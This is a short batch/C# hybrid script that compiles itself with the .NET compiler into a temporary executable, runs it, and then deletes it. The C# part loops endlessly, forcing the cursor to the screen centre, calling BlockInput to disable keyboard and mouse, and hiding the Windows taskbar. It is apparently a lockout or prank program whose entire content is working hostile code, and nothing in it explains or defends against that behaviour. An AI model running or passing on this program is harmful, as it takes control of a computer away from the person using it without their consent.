// 2>nul||goto :start
/*
:start
@echo off
cls
set "csc="
for /r "%SystemRoot%\Microsoft.NET\Framework\" %%# in ("*csc.exe") do set "csc=%%#"

if not exist "%csc%" echo Can't find NET.Framework&&exit

call %csc% /nologo /warn:0 /out:"%TEMP%\%~n0.exe" "%~dpsfnx0"
call "%TEMP%\%~n0.exe%"
del "%TEMP%\%~n0.exe%">nul
exit
*/

using System;
using System.Runtime.InteropServices;
namespace Cursor {
    public class CursorPosition {
        [DllImport("user32.dll")]
        public static extern int SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
 
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);
        
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        public static void Main(){
        int hwnd = FindWindow("Shell_TrayWnd","");
        
        while(true){

            SetCursorPos(GetSystemMetrics(0)/2,GetSystemMetrics(1)/2);
            BlockInput(true);
            ShowWindow(hwnd,SW_HIDE);
        }
}}}